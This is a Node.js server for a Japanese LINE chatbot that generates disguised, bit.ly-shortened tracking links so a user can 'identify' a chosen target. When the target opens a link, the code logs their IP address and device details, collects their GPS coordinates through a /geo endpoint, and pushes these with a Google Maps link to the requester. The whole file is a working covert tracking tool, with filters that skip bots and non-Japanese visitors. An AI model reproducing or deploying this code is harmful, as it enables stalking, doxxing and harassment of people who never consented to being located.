const https = require("https");
const qs = require("querystring");
const request = require("request");
const cors = require("cors");
const express = require("express");
const port = process.env.PORT || 3000;
const TOKEN = process.env.LINE_TOKEN;
const bitly_token = process.env.BITLY_TOKEN;
const firebase_token = process.env.FIREBASE_TOKEN;
let lock = false, random = 400, original = '', push_status = false, geolocation = '', nom = '', id = '';

const app = express();

app
  .use(cors())
  .use(express.urlencoded({
    extended: true
  }))
  .use(express.json())
  .post("/webhook", (req, res) => {
    // reply
    res.send("HTTP POST request sent to the webhook URL!");
    random = ~~(Math.random() * 899999 + 100000);
    const userId = req.body.events[0].source.userId;
    const replyToken = req.body.events[0].replyToken;
    const ms = req.body.events[0].message.text;
    if (req.body.events[0].type === 'message') {
      const text = (ms.match(/発行/) || ms.match(/generate/i) || ms.match(/URL/i) || ms.match(/生成/)) ?
      "下記のサイトで特定したい相手の名前と元のURL、認証コードを入力してください\n\nhttps://zackdnerrr-88a45.web.app/?userId=" + userId + "\n\n認証コード: " + random 
      : "URLを発行したい場合は「URLを発行したい」「URLを生成して」などと話しかけてみてください";
      replyMsg(replyToken, text);
    };
  })
  .post("/pass", (req, res) => {
    (req.body.text === "ぴやっほゃ") ? res.send(JSON.stringify({pass: random})) : res.sendStatus(415);
  })
  .post("/lock", (req, res) => {
    if(req.body.text === "fucker") {
      lock = true;
      res.sendStatus(200);
      setTimeout(() => {
        lock = false;
      }, 1.8e+6);
    };
  })
  .get("/check", (req, res) => {
    res.send(JSON.stringify({boo: lock}));
  })
  .post("/generated", (req, res) => {
    const name = req.body.name, url = req.body.url, userId = req.query.userId || null;
    const geo = req.query.geo || 'false'; 
    const query = {
      name: name,
      original: url,
      id: userId,
      geo: geo
    };
    const longUrl = "https://static-void.herokuapp.com/get/ip/nero?" + qs.stringify(query),
    req_url = "https://api-ssl.bitly.com/v3/shorten?" + qs.stringify({
      access_token: bitly_token,
      longUrl: longUrl
    });
    const options = {
      url: req_url,
      method: "GET",
      json: true
    };
    request(options, (err, response, body) => {
      if (err || body.status_code !== 200) {console.log(err); return};
      const generated = body.data.url || longUrl;
      res.send(JSON.stringify({access_url: generated}));
    });
  })
  .get("/get/ip/nero", (req, res) => {
    nom = req.query.name; id = req.query.id;
    original = req.query.original; geolocation = req.query.geo;
    res.sendFile(__dirname + '/open.html');
    // get ip
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.connection.socket.remoteAddress || req.socket.remoteAddress || '0.0.0.0', 
    str = (ip.match(/[^0-9.]/g)) ? ip.replace(/[^0-9.]/g, "") : ip;
    // push msg
    ( !id ||  !(String(req.headers["accept-language"]).match(/ja/))
    || req.headers["user-agent"] === "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
    || req.headers["user-agent"] === 'bitlybot/3.0 (+http://bit.ly/)' 
    ) ? push_status = false : push_status = true;
    if(push_status) {
        pushMsg(`${nom}さんがURLにアクセスしました\n\nIPアドレス: ${str}\n\n使用デバイス:\n${req.headers["user-agent"]}`, id);
        console.log(`名前: ${nom}\nIPアドレス: ${str};`);
      };
  })
  .get("/auth", (req, res) => {
    const URL = original || "https://zackdnerrr-88a45.web.app/";
    res.send(JSON.stringify({url: URL, geo: geolocation, name: nom, id: id}));
  })
  .post("/geo", (req, res) => {
    res.sendStatus(200);
    pushMsg(`${req.body.name}さんの位置情報が取得できました\n\n緯度: ${req.body.lat}\n経度: ${req.body.lng}\n\ngoogleマップで見る\nhttps://www.google.co.jp/maps?q=${req.body.lat},${req.body.lng}&z=18`, req.body.id);
  })
  .listen(port, () => console.log("listening on " + port))
;

function replyMsg(replyToken, text) {
  const dataString = JSON.stringify({
    replyToken: replyToken,
    messages: [{"type": "text", "text": text}]
  });
  const webhookOptions = {
    "hostname": "api.line.me",
    "path": "/v2/bot/message/reply",
    "method": "POST",
    "headers": {
      "Content-Type": "application/json",
      "Authorization": "Bearer " + TOKEN
    },
    "body": dataString
  };
  const request = https.request(webhookOptions, (res) => {
      res.on("data", (d) => {
        process.stdout.write(d);
      })
    })
  request.on("error", (err) => {
    console.error(err);
  })
  request.write(dataString);
  request.end();
}

function pushMsg(text, id) {
  const body = JSON.stringify({
    to: id,
    messages: [
      {"type": "text", "text": text}
    ]
  });
  const options = {
    "hostname": "api.line.me",
    "path": "/v2/bot/message/push",
    method: "POST",
    headers: {
      "Content-Type": "application/json; charset=UTF-8",
      "Authorization": "Bearer " + TOKEN
    },
    body: body
  };
  const request = https.request(options, (res) => {
    res.on("data", (d) => {
      process.stdout.write(d);
    });
  });
  request.on("error", (err) => {
    console.error(err);
  });
  request.write(body);
  request.end();
};
